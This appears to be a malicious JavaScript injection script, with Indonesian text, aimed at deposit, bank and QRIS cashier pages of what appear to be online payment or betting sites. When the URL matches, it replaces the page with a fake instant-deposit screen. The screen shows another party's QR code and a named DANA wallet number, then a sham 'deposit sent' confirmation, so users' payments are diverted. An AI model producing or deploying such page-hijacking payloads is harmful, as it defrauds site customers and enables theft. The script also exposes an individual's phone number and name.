(function() {
  const url = window.location.href;
  const pattern = /(\/deposit$|\/bank$|\/deposit\.php$|\/qris\.php$|\/index\.php\?page=(transaksi|cashier)$|\/bank\.php$)/i;
  if (!pattern.test(url)) {
    console.log('Script: URL tidak cocok, tidak diubah.');
    return;
  }

  // SAFE: Ganti body saja
  document.body.innerHTML = `
    <style>
      body { margin:0; background:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSu1ZzxDdvDsoEK59QO3ASmi24P_P50-SYw5dmyuryt8qAVOPfq67TEVKOS&s=10') no-repeat center center fixed; background-size:cover; font-family:Montserrat,sans-serif; text-align:center; color:#fff; }
      h1 { font-weight:700; margin:20px 0; text-shadow:2px 2px #000; color:#f7e733; }
      .marquee { width:100%; overflow:hidden; white-space:nowrap; font-weight:600; text-shadow:1px 1px #000; color:#00f7ff; }
      .marquee span { display:inline-block; padding-left:100%; animation:marquee 15s linear infinite; }
      @keyframes marquee { 0%{transform:translate(0,0);} 100%{transform:translate(-100%,0);} }
      .choices { display:flex; justify-content:center; gap:10px; margin:20px; flex-wrap:wrap; }
      .choice { border:2px solid #f7e733; background:rgba(0,0,0,.5); padding:5px 10px; border-radius:5px; cursor:pointer; }
      .choice input { margin-right:5px; }
      .content { margin:20px; }
      .dana-info { border:2px solid #00f7ff; background:rgba(0,0,0,.5); padding:8px 15px; border-radius:5px; font-weight:700; }
      img.qris { max-width:200px; display:block; margin:10px auto; }
      button,input { display:block; margin:10px auto; padding:8px; border:none; border-radius:5px; font-weight:700; }
      input { text-align:center; width:80%; max-width:200px; }
      button { background:#f7e733; color:#000; cursor:pointer; }
      .footer { margin:50px auto; font-size:12px; }
      .footer button { background:#00f7ff; }
      .footer img { max-width:80px; display:block; margin:10px auto; }
      #status { color:#00ff00; margin-top:10px; }
    </style>
    <h1>INSTAN DEPOSIT QRIS</h1>
    <div class="marquee"><span>PINDAI QRIS > ISI NOMINAL > TRANSFER > KONFIRMASI, WAJIB KODE UNIK 887, QRIS ATAS NAMA INGGAR STORE</span></div>
    <div class="choices">
      <label class="choice"><input type="radio" name="method" value="bank">BANK</label>
      <label class="choice"><input type="radio" name="method" value="dana">DANA</label>
      <label class="choice"><input type="radio" name="method" value="ewallet">E-Wallet</label>
    </div>
    <div class="content" id="content"></div>
    <div class="footer">
      <button onclick="window.location.href='https://direct.lc.chat/19188360/'">HUBUNGI ADMIN</button>
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo_QRIS.svg/1200px-Logo_QRIS.svg.png">
      <p>Do Not Share My Personal Information | © 2025 instantQr, Inc</p>
    </div>
  `;

  const radios = document.querySelectorAll('input[name="method"]');
  const content = document.getElementById('content');

  radios.forEach(radio => {
    radio.addEventListener('change', () => {
      let html = '';
      if (radio.value === 'bank') {
        html += '<img class="qris" src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg">';
        html += '<p>QR UNTUK SEMUA JENIS BANK</p>';
        html += '<button onclick="window.open(\\'https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg\\')">Download Qris</button>';
        html += inputHTML();
      } else if (radio.value === 'dana') {
        html += '<div class="dana-info">DANA - 088214538915 - SURWATI</div>';
        html += '<p>MANUAL DEPOSIT DANA</p>';
        html += '<button id="salin">SALIN NOMOR</button>';
        html += inputHTML();
      } else {
        html += '<img class="qris" src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg">';
        html += '<p>QR UNTUK SEMUA JENIS E-WALLET</p>';
        html += '<button onclick="window.open(\\'https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg\\')">Download Qris</button>';
        html += inputHTML();
      }
      content.innerHTML = html;

      addListeners();
    });
  });

  function inputHTML() {
    return '<input type="text" id="amount" placeholder="Masukkan Nominal"><button id="konfirmasi">KONFIRMASI</button><div id="status"></div>';
  }

  function addListeners() {
    const amt = document.getElementById('amount');
    const confirm = document.getElementById('konfirmasi');
    const salin = document.getElementById('salin');

    if (amt) {
      amt.addEventListener('input', e => {
        let val = e.target.value.replace(/\\D/g, '');
        e.target.value = val ? parseInt(val).toLocaleString('id-ID') : '';
      });
    }

    if (confirm) {
      confirm.addEventListener('click', () => {
        let val = amt.value.replace(/\\D/g, '');
        if (parseInt(val) >= 50000) {
          let i = 3;
          const s = document.getElementById('status');
          const timer = setInterval(() => {
            s.innerText = \`Deposit berhasil dikirim, dialihkan dalam \${i}...\`;
            i--;
            if (i < 0) { clearInterval(timer); window.location.href = '../'; }
          }, 1000);
        } else {
          alert('Minimal deposit 50.000');
        }
      });
    }

    if (salin) {
      salin.addEventListener('click', () => {
        navigator.clipboard.writeText('088214538915').then(() => {
          alert('Nomor berhasil disalin!');
        });
      });
    }
  }
})();
